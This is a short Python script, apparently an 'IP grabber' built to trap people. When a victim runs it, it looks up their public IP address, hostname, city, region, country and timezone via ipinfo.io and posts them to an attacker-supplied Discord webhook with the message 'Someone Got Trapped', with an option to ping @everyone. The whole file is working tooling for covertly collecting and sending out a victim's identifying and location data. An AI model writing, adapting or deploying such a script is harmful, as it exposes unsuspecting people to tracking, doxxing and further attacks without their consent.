import requests, json

hi = "https://ipinfo.io/json" #Don't change this
discord_webhook = "" #Put your discord webhook here

ping_everyone = "False" #Change this to True if you want to mention @everyone when someone trapped

stats = requests.get(hi)
json_stats = stats.json()
ip = json_stats["ip"]
city = json_stats["city"]
region = json_stats["region"]
hostname = json_stats["hostname"]
country = json_stats["country"]
timezone = json_stats["timezone"]

log = f"Someone Got Trapped\n```IP: {ip}\nHostname: {hostname}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}```"

wow = f"@everyone Wakey wakey, someone got trapped\n```IP: {ip}\nHostname: {hostname}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}```"

def dextor():
    data = {"content": log}
    requests.post(discord_webhook, data=json.dumps(data), headers={ "Content-Type": "application/json"})

def lab():
    data = {"content": wow}
    requests.post(discord_webhook, data=json.dumps(data), headers={ "Content-Type": "application/json"})

if ping_everyone == "False":
  dextor()
elif ping_everyone == "True":
  lab()
